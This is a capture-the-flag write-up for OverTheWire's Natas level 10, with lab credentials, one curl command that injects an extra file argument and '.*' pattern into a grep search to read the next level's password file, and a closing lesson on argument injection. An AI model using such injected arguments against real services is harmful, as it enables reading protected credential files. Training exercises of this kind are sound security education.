# Natas Level 10 to 11

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 10 -> 11 |
| Status | Complete |

## Objective

Bypass a command-injection filter that blocks `;`, `|`, and `&`.

## Given Access

User: `natas10`

Password:

```text
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

## Method

The command is still `grep -i <input> dictionary.txt`. Instead of adding a new command, pass an extra filename to `grep` and use `.*` as a pattern.

## Commands

```bash
curl -s -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu \
  --get \
  --data-urlencode 'needle=.* /etc/natas_webpass/natas11 #' \
  http://natas10.natas.labs.overthewire.org/
```

## Result

Password for `natas11`:

```text
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```

## Lesson

Filtering a few shell separators does not make command construction safe. Argument injection can still change what the intended command reads.

## References

- https://overthewire.org/wargames/natas/
